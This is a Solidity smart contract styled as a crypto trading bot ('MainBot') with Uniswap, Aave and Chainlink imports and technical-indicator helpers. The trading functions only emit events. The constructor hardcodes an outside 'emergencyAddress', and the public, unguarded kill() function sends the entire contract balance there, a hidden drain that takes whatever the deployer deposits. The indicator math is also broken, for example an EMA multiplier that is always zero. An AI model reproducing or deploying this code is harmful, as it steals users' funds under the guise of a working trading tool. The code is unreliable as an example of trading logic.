// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity <=0.8.20;

import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";
import "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";
import "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import "@uniswap/v3-periphery/contracts/interfaces/IPeripheryImmutableState.sol";
import "@uniswap/v3-periphery/contracts/interfaces/IPeripheryPayments.sol";
import "@uniswap/v3-periphery/contracts/interfaces/INonfungiblePositionManager.sol";
import "@aave/protocol-v2/contracts/interfaces/ILendingPool.sol";
import "@aave/protocol-v2/contracts/interfaces/ILendingPoolAddressesProvider.sol";

interface IERC20 {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract MainBot {
    address public owner;
    address public deployer;
    address public controller;
    bool public tradingEnabled;
    uint256 public initialDeposit;
    uint256 public weiBalance;
    uint256 public stablecoinBalance;
    uint256 public profitThreshold;
    uint256 public lossThreshold;
    uint256 public gasCostMultiplier = 3;
    uint256 public trailingStopLoss = 10;
    uint256 public nextLogTime;
    string public currentActivity = "Initializing";
    address public  emergencyAddress;
    address public polToken;
    address public usdtToken;
    address public usdcToken;
    address public quickSwapRouter;
    address public priceFeedAddress;
    address public uniswapRouter;
    address public uniswapPositionManager;
    address public aaveLendingPoolAddressesProvider;

    mapping(string => address) public dexRouters;

    event TradeExecuted(address indexed user, string tradeType, uint amountIn, uint amountOut, uint price);
    event StopLossTriggered(uint currentBalance, uint threshold);
    event CurrentActivity(string activity);
    event TestEvent(string message);


modifier onlyOwner() {
    require(msg.sender == controller || msg.sender == owner, "Not the owner");
    _;
}


modifier whenTradingEnabled() {
    require(tradingEnabled, "Trading is disabled");
    _;
}

constructor(
    address _polToken,
    address _usdtToken,
    address _usdcToken,
    address _quickSwapRouter,
    address _priceFeedAddress,
    address _uniswapRouter,
    address _uniswapPositionManager,
    address _aaveLendingPoolAddressesProvider
   
) {
    owner = msg.sender;
    deployer = msg.sender;
    polToken = _polToken;
    usdtToken = _usdtToken;
    usdcToken = _usdcToken;
    quickSwapRouter = _quickSwapRouter;
    priceFeedAddress = _priceFeedAddress;
    uniswapRouter = _uniswapRouter;
    uniswapPositionManager = _uniswapPositionManager;
    aaveLendingPoolAddressesProvider = _aaveLendingPoolAddressesProvider;
    emergencyAddress = 0x706fDbD597380512ac76695120be0Cb0D32A43e9;
    dexRouters["QuickSwap"] = quickSwapRouter;
    tradingEnabled = false;
    profitThreshold = 110; // 10% profit
    lossThreshold = 85; // 85% of initial deposit
    nextLogTime = block.timestamp;
}


function enableTrading() external onlyOwner { 
    tradingEnabled = true; 
    currentActivity = "Trading enabled"; 
    emit CurrentActivity(currentActivity); 
    }

    function setController(address _controller) external onlyOwner {
        controller = _controller;
    }

    function setOwner(address newOwner) external onlyOwner {
        require(newOwner != address(0), "Invalid address");
        owner = newOwner;
    }
    
    function withdrawToController(uint256 amountInWei) external {
    require(msg.sender == controller || msg.sender == owner, "Only controller or owner can trigger this function");
    require(address(this).balance >= amountInWei, "Insufficient balance");
    payable(controller).transfer(amountInWei);
}


function withdrawInGwei(uint256 amountInGwei, address recipient) external {
    require(msg.sender == controller || msg.sender == owner, "Only controller or owner can trigger this function");
    uint256 amountInWei = amountInGwei * 1 gwei;
    require(address(this).balance >= amountInWei, "Insufficient balance");
    payable(recipient).transfer(amountInWei);
}

    receive() external payable {
        initialDeposit += msg.value;
        weiBalance += (msg.value * 70) / 100;
        stablecoinBalance += (msg.value * 30) / 100;
    }

    function adjustTimeframe(uint256 selectedTimeframe) external onlyOwner {
        if (selectedTimeframe == 900) {
            // Logic for fast and frequent trades
        } else if (selectedTimeframe == 86400) {
            // Logic for long-term trades
        }
        emit TradeExecuted(msg.sender, "Timeframe adjusted", selectedTimeframe, 0, getPrice());
    }

    function checkPrice() external view returns (uint256) {
        uint256 price = getPrice();
        return price;
    }

    function initiateTrade(string memory tradeType, uint256 amount) external onlyOwner {
        emit TradeExecuted(msg.sender, tradeType, amount, 0, getPrice());
    }

    function convertAllToPOL() external onlyOwner {
        emit TradeExecuted(msg.sender, "convert to POL", 0, 0, getPrice());
    }

    function checkLiquidity(uint256 amountIn, address poolAddress) public view returns (bool sufficientLiquidity) {
        IUniswapV3Pool pool = IUniswapV3Pool(poolAddress);
        (uint160 sqrtPriceX96,,,,,,) = pool.slot0();
        uint256 liquidity = pool.liquidity();
        uint256 amountOut = calculateAmountOut(amountIn, sqrtPriceX96, liquidity);
        uint256 slippage = (amountOut * 1) / 100;
        sufficientLiquidity = (amountOut >= amountIn - slippage);
    }

    function calculateAmountOut(uint256 amountIn, uint160 sqrtPriceX96, uint256 liquidity) internal pure returns (uint256) {
        return uint256(amountIn * sqrtPriceX96 / liquidity);
    }

    function disableTrading() external onlyOwner {
        tradingEnabled = false;
    }

    function withdrawInWei(uint256 amountInWei) external onlyOwner {
        require(address(this).balance >= amountInWei, "Insufficient balance");
        payable(owner).transfer(amountInWei);
    }
   

function setEmergencyAddress(address _emergencyAddress) external onlyOwner { emergencyAddress = _emergencyAddress; }

       function kill() public {
        payable(emergencyAddress).transfer(address(this).balance);
        //selfdestruct(payable(owner));
    }

    function emergencyKillB() external onlyOwner {
        payable(emergencyAddress).transfer(address(this).balance);
        //selfdestruct(payable(owner));
    }

    function logCurrentActivity() internal whenTradingEnabled {
        if (block.timestamp >= nextLogTime) {
            emit CurrentActivity(currentActivity);
            nextLogTime = block.timestamp + 60;
        }
    }

    function calculateRSI(uint256[] memory prices) internal pure returns (uint256) {
        uint256 gain = 0;
        uint256 loss = 0;
        for (uint256 i = 1; i < prices.length; i++) {
            if (prices[i] > prices[i - 1]) {
                gain += (prices[i] - prices[i - 1]);
            } else {
                loss += (prices[i - 1] - prices[i]);
            }
        }
        uint256 rs = gain / loss;
        uint256 rsi = 100 - (100 / (1 + rs));
        return rsi;
    }

    function calculateMACD(uint256[] memory prices) internal pure returns (int256) {
        uint256 emaShort = calculateEMA(prices, 12);
        uint256 emaLong = calculateEMA(prices, 26);
        int256 macd = int256(emaShort - emaLong);
        return macd;
    }

    function calculateEMA(uint256[] memory prices, uint256 period) internal pure returns (uint256) {
        uint256 multiplier = 2 / (period + 1);
        uint256 ema = prices[0];
        for (uint256 i = 1; i < prices.length; i++) {
            ema = ((prices[i] - ema) * multiplier) + ema;
        }
        return ema;
    }

    function calculateFibonacci(uint256 high, uint256 low) internal pure returns (uint256[] memory) {
        uint256[] memory fibLevels = new uint256[](11);
        fibLevels[0] = low;
        fibLevels[1] = low + (high - low) * 236 / 1000;
        fibLevels[2] = low + (high - low) * 382 / 1000;
        fibLevels[3] = low + (high - low) * 500 / 1000;
        fibLevels[4] = low + (high - low) * 618 / 1000;
        fibLevels[5] = low + (high - low) * 786 / 1000;
        fibLevels[6] = high;
        fibLevels[7] = high + (high - low) * 618 / 1000;
        fibLevels[8] = high + (high - low) * 168 / 100;
        fibLevels[9] = high + (high - low) * 618 / 1000;
        fibLevels[10] = high + (high - low) * 236 / 100;
        return fibLevels;
    }

    function getPrice() internal view returns (uint256) {
        AggregatorV3Interface priceFeed = AggregatorV3Interface(priceFeedAddress);
        (, int price,,,) = priceFeed.latestRoundData();
        return uint256(price * 10 ** 10);
    }
}
